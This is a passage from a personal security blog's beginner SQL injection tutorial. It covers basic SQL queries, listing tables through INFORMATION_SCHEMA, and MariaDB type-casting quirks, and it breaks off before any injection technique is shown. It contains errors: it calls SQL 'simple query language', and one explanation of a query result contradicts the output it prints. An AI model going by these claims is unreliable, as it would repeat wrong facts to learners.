<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="SQL Injection" /><meta name="author" content="krygennn" /><meta property="og:locale" content="en" /><meta name="description" content="In this article you will learn SQL Injection fundamentals from 0 to hero. In order to understand SQL injections, it is essential to observe those two concepts seperately." /><meta property="og:description" content="In this article you will learn SQL Injection fundamentals from 0 to hero. In order to understand SQL injections, it is essential to observe those two concepts seperately." /><link rel="canonical" href="https://krygennn.github.io/posts/sql-injection/" /><meta property="og:url" content="https://krygennn.github.io/posts/sql-injection/" /><meta property="og:site_name" content="Burak Baris" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-13T12:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SQL Injection" /><meta name="twitter:site" content="@Krygen2" /><meta name="twitter:creator" content="@krygennn" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"krygennn"},"description":"In this article you will learn SQL Injection fundamentals from 0 to hero. In order to understand SQL injections, it is essential to observe those two concepts seperately.","url":"https://krygennn.github.io/posts/sql-injection/","@type":"BlogPosting","headline":"SQL Injection","dateModified":"2021-10-13T12:00:00+00:00","datePublished":"2021-10-13T12:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://krygennn.github.io/posts/sql-injection/"},"@context":"https://schema.org"}</script><title>SQL Injection | Burak Baris</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Burak Baris"><meta name="application-name" content="Burak Baris"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/favicons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Burak Baris</a></div><div class="site-subtitle font-italic">krygeNNN / Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a><li class="nav-item"> <a href="/cv/" class="nav-link"> <i class="fa-fw fas fa-file ml-xl-3 mr-xl-3 unloaded"></i> <span>CV</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/krygeNNN" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Krygen2" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['imbarisburak','protonmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/burak-baris" aria-label="linkedin" class="order-6" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-7" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SQL Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SQL Injection</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> krygennn </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Oct 13, 2021, 12:00 PM +0000" >Oct 13<i class="unloaded">2021-10-13T12:00:00+00:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3830 words">21 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 800 450'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql2.jpg" class="preview-img" alt="SQL INJECTION" width="800" height="450"><p>In this article you will learn SQL Injection fundamentals from 0 to hero. <br /> In order to understand SQL injections, it is essential to observe those two concepts seperately.</p><h2 id="what-is-injection-">WHAT IS INJECTION ?</h2><p>Injection refers to a broad variety of attack vectors. An attacker feeds the program with malicious input. This input interpreted by the program and works for attackerâ€™s favour.This vulnerability occurs when the input is not controlled with meticulousness before or after input has taken.There are bunch of different kind of injections out there. Examples are javascript ,ldap, xpath, host header, code, email header and crlf injections and SQL injection is one of them.</p><h2 id="what-is-sql-">WHAT IS SQL ?</h2><p>SQL stands for <strong>simple query language</strong>. What it does is basically, managing data held in databases. It is particularly useful in handling structured data. So whenever you ask for spesific part of data you can request it in any order or concatanate it with different data held in different data table. There are bunch of different sql types, MySQL, SqLite, PostgreSQL, Microsoft SQL Server and etc. They are actually more or less all the same except for the syntax diffrences between them.</p><h3 id="understanding-sql">Understanding SQL</h3><p>Let us examine the behavior of SQL codes by using <a href="https://www.sqliteonline.com"><strong>sqliteonline</strong></a></p><p><img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql.jpg" alt="Desktop View" /> <br /></p><h4 id="why-sql-">Why SQL ?</h4><p>As you can see, there is a table consists of 3 columns and 21 rows.Those are basically <strong>key</strong> and <strong>value</strong> pairs. In this spesific example <code class="language-plaintext highlighter-rouge">ID</code> is the <strong>Key</strong> value, <code class="language-plaintext highlighter-rouge">Name</code> and <code class="language-plaintext highlighter-rouge">Hint</code> are the <strong>value</strong>s which defined by that spesific â€˜IDâ€™ numer of <strong>1</strong>.However, as you can guess, it is not practical to summon whole data each time when we want to use or see one or couple parts of the data. In addition, we may want to combine different data parts together, so that is why we use SQL.</p><h4 id="sql-basics">SQL Basics</h4><p>Every table has its own name, and the name of the table above is <strong>demo</strong>.It is not needed to be an expert SQL programmer, but you need to understand the principles of SQL programming, so let us start with some basics.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span><span class="p">;</span>
</pre></table></code></div></div><p>This command selects everything from demo table, fetches full content from the table. You can see the output at the picture above. <br /><br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span>
</pre></table></code></div></div><p>If you want to bring the informations related to â€˜IDâ€™ number of 3, you can add <code class="language-plaintext highlighter-rouge">WHERE</code> clause at the end of the query, and specify the filter. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql3.jpg" alt="Desktop View" /> <br /><br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">ID</span><span class="o">=</span><span class="mi">3</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">WHERE</span> <span class="n">Name</span><span class="o">=</span><span class="nv">"Chart"</span><span class="p">;</span>
</pre></table></code></div></div><p>You can concatenate two different queries together by using â€˜UNIONâ€™, however result of the queries have to have same amount of columns, otherwise it will not work. In this example, there is only one table called <strong>demo</strong>, so naturally all the selections will have 3 columns.If the result of the select queries of different tables have different amount of columns, you can not <code class="language-plaintext highlighter-rouge">UNION</code> the result of the selections together. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql4.jpg" alt="Desktop View" /> <br /> <br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">demo</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">name</span> <span class="k">ASC</span><span class="p">;</span>
</pre></table></code></div></div><p>You can order the table with <code class="language-plaintext highlighter-rouge">ORDER BY</code> clause.You can either put column number with numerics, or column name both <code class="language-plaintext highlighter-rouge">ASC</code> ascending and <code class="language-plaintext highlighter-rouge">DESC</code> descending order. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql5.jpg" alt="Desktop View" /> <br /><br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="k">table_name</span> <span class="k">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="mi">1</span> <span class="k">ASC</span><span class="p">;</span>
</pre></table></code></div></div><p>See all the tables existing in the currently active database. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql6.jpg" alt="Desktop View" /> <br /><br /></p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SHOW</span> <span class="n">DATABASES</span><span class="p">;</span>
</pre></table></code></div></div><p>See all the created databases. <img data-proofer-ignore data-src="/assets/img/posts/fundamentals-of-sql-injection/sql7.jpg" alt="Desktop View" /></p><h3 id="summary">Summary</h3><p>Understanding this much of SQL will do for now.In this section I wrote about basics of SQL, however in the following sections I will be writing about tricks and tactics about SQL Injection, it is more imporant to understand very fundamentals rather than complex queries.</p><h2 id="primitives-of-database-logic">PRIMITIVES OF DATABASE LOGIC</h2><p>From now on, you know how sql works, and the idea behind that. In this section, before moving on to the exploitation phase, you will learn bare-bones of <strong>SQLi</strong>, database logic and do some brainstorm. In this section I will be using <strong>MariaDB</strong>, it is community developed database management system for MySQL.</p><h3 id="mariadbmysql">MariaDB/MySQL</h3><p>I fired up my terminal and run my mariadb service. Without selecting any database or any table, I will run the following query. Try to guess the result of it.</p><ul><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">;</span>
</pre></table></code></div></div><p>It returns</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">---+</span>
<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">#&gt;&gt;&gt;</span> <span class="n">This</span> <span class="k">is</span> <span class="n">the</span> <span class="k">column</span> <span class="n">name</span>
<span class="o">+</span><span class="c1">---+</span>
<span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="o">#&gt;&gt;&gt;</span> <span class="n">This</span> <span class="k">is</span> <span class="n">the</span> <span class="n">value</span> <span class="n">corresponds</span> <span class="k">to</span> <span class="n">that</span> <span class="k">column</span><span class="p">.</span>
<span class="o">+</span><span class="c1">---+</span>
</pre></table></code></div></div><p>Does not make too much sense right ? Let us move further. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</pre></table></code></div></div><p>How do you think this will end up ?</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span>   <span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
</pre></table></code></div></div><p>From now on, we know that we can do <strong>mathematical operations</strong> with integers in sql, this is huge. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2-1'</span><span class="p">;</span>
</pre></table></code></div></div><p>It is same as before except for the single quotes.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
</pre></table></code></div></div><p>This time what we see is returning of a string value. It is reasonable because single or double quotes are used for strings. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span><span class="o">-</span><span class="s1">'1'</span><span class="p">;</span>
</pre></table></code></div></div><p>It is hard to predict what is going to happen this time right ? Let us see.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span> <span class="s1">'2'</span><span class="o">-</span><span class="s1">'1'</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span>       <span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
</pre></table></code></div></div><p>Database actually performed the same mathematical operation as before when we did <code class="language-plaintext highlighter-rouge">SELECT 2-1</code>. That is because just like you, databaseâ€™s mind get confused too, so it came up with an idea that â€˜Oh wait, I can cast them into integers !â€™.Now we are one more step closer to understand the primitive behaviour of how databases work actually. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span><span class="o">+</span><span class="s1">'a'</span><span class="p">;</span>
<span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span> <span class="s1">'2'</span><span class="o">+</span><span class="s1">'a'</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span>       <span class="mi">2</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
</pre></table></code></div></div><p>Hmm, brains burning right ? It is simple really, just like before database converted string value to integer, however it could not convert <strong>a</strong> to any integer, so it considered it as <strong>0</strong>.By having this knowledge you should guess the output of this query. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'b'</span><span class="o">+</span><span class="s1">'a'</span><span class="p">;</span>
</pre></table></code></div></div><p>You predicted it ?</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span> <span class="s1">'b'</span><span class="o">+</span><span class="s1">'a'</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
<span class="o">|</span>       <span class="mi">0</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------+</span>
</pre></table></code></div></div><p>This time two non-convertible to integer values given into single quoutes, database performed <strong>0+0</strong> this time. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span><span class="p">;</span>
</pre></table></code></div></div><p>This time instead putting an operation sign between those strings, we will left it blank.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Text "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>+----+
| 2  |
+----+
| 21 |
+----+
</pre></table></code></div></div><p>As you can see, strings had been concatanated. So <code class="language-plaintext highlighter-rouge">SELECT '2' '1'</code> and <code class="language-plaintext highlighter-rouge">concat('2','1')</code> do the same thing. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="p">;</span>
</pre></table></code></div></div><p>You should be able to guess this one.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">2</span>   <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
<span class="o">|</span> <span class="mi">21</span><span class="n">a</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----+</span>
</pre></table></code></div></div><p>Yes you are right, still string concat. <br /> <br /></p><li><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</pre></table></code></div></div><p>From now on we know that, <code class="language-plaintext highlighter-rouge">'a'-1</code> will result -1. So this time instead of string concat, it will substract -1 from 21.</p><div class="language-sql highlighter-rouge"><div class="code-header"> <span text-data=" Sql "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">+</span><span class="c1">---------------+</span>
<span class="o">|</span> <span class="s1">'2'</span> <span class="s1">'1'</span> <span class="s1">'a'</span><span class="o">-</span><span class="mi">1</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------+</span>
<span class="o">|</span>            <span class="mi">20</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">---------------+</span>
